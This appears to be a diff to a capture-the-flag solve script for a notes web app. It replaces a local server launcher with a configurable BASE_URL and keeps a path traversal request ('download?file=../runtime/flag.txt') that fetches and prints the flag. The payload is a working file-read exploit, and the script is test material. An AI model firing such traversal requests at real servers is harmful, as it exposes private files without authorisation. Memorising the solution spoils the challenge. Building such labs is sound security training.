@@ -3,40 +3,18 @@ from __future__ import annotations
 
 import os
 import re
-import socket
-import subprocess
-import sys
-import time
 import urllib.request
-from pathlib import Path
-
-
-def start(app: Path, port: int):
-    env = os.environ.copy()
-    env['PORT'] = str(port)
-    env.setdefault('FLAG', 'flag{local_web_notes_download}')
-    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    for _ in range(80):
-        try:
-            with socket.create_connection(('127.0.0.1', port), timeout=0.1):
-                return proc
-        except OSError:
-            time.sleep(0.1)
-    raise SystemExit('server not ready')
 
 
 def main() -> None:
-    root = Path(__file__).resolve().parents[1]
-    proc = start(root / 'docker' / 'app.py', 18108)
-    try:
-        body = urllib.request.urlopen('http://127.0.0.1:18108/download?file=../runtime/flag.txt').read().decode()
-        match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
-        if not match:
-            raise SystemExit('flag not found')
-        print(match.group(0))
-    finally:
-        proc.terminate()
-        proc.wait(timeout=5)
+    base_url = os.getenv('BASE_URL', 'http://127.0.0.1:8080').rstrip('/')
+    body = urllib.request.urlopen(
+        f'{base_url}/download?file=../runtime/flag.txt'
+    ).read().decode()
+    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
+    if not match:
+        raise SystemExit('flag not found')
+    print(match.group(0))
 
 
 if __name__ == '__main__':
